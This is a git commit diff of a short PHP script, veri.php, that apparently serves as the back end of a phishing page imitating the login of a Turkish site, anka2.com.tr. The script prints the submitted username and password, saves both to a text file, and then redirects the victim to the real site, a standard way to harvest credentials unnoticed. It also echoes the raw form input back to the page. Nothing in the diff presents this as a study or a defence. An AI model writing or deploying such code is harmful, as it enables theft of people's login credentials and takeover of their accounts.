4e1d7c219205b5aa55edeeebbc11c1608c08f8a1
ankamt2 <112321774+ankamt2@users.noreply.github.com>
2023-05-26 20:24:58 +0300

    Update veri.html

--- veri.php
+++ veri.php
@@ -1,21 +1,34 @@
-<?php
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <?php
 
 
 
-echo "Kullanıcı Adı: ".$_POST["login"]."<br>";
-echo "Şifre: ".$_POST["password"];
+    echo "Kullanıcı Adı: ".$_POST["login"]."<br>";
+    echo "Şifre: ".$_POST["password"];
 
-$dosya=fopen("/login/Veriler.txt","w+");  
-fwrite($dosya, "Kullanıcı Adı: ".$_POST["login"]);
-fwrite($dosya, "Şifre: ".$_POST["password"]);
-
-
-
-header("Location: https://www.anka2.com.tr");
+    $dosya=fopen("Veriler.txt","w+");  
+    fwrite($dosya, "Kullanıcı Adı: ".$_POST["login"]);
+    fwrite($dosya, "Şifre: ".$_POST["password"]);
 
 
 
+    header("Location: https://www.anka2.com.tr");
 
-// https://www.anka2.com.tr/account/loginPost
+
+
+
+    // https://www.anka2.com.tr/account/loginPost
+    ?>
+    
+</body>
+</html>
 
 
